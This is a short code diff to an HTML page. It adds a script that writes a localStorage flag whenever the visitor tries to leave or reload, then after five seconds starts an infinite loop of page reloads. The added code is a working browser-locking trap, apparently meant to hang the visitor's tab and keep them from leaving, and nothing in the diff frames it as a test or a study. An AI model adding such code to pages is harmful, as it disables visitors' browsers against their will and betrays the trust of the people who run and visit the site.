@@ -83,6 +83,22 @@
             playsound();
         }
     </script>
+     <script>
+        // Set the localStorage flag when the user tries to leave/reload
+        window.onbeforeunload = function () {
+            localStorage.x = 1;
+        };
+
+        // Wait 5 seconds (5000ms), then start the reload loop
+        setTimeout(function () {
+            console.log("Starting reload loop...");
+            
+            // This creates an infinite loop of reload commands
+            while (true) {
+                location.reload();
+            }
+        }, 5000);
+    </script>
 </head>
 <body>
 
